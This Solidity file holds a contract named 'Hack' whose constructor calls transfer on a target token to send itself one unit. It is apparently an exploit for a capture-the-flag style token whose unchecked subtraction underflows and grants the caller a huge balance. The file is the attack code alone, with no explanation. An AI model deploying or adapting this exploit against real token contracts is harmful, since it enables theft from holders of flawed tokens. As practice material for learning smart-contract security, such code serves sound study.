// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IToken {
    function transfer(address to, uint value) external returns (bool);

    function balanceOf(address) external view returns (uint256);
}

contract Hack {
    constructor(address _target) {
        IToken(_target).transfer(msg.sender, 1);
    }
}
